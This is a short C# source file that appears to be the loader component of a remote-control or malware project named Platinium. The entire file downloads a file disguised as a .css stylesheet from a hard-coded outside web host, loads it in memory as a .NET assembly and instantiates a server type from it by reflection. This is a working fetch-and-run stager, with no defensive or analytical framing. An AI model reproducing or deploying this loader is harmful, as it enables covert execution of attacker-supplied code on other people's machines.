using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace PlatiniumServer
{
    class Server
    {
        private static string DLL_URL = "http://repositorio123.esy.es/Platinium.css";
        private byte[] raw_assembly;
        private Assembly assembly;
        private Type type;
        public Server()
        {
            InitializeEnvironment();
            Initialize();
        }
        private void Initialize()
        {
            type = assembly.GetType("Platinium.Shared.Entities.Server");
            object server = Activator.CreateInstance(type);
        }
        private void InitializeEnvironment()
        {
            using (var client = new WebClient())
            {
                raw_assembly = client.DownloadData(DLL_URL);
            }
            assembly = Assembly.Load(raw_assembly);
        }
    }
}
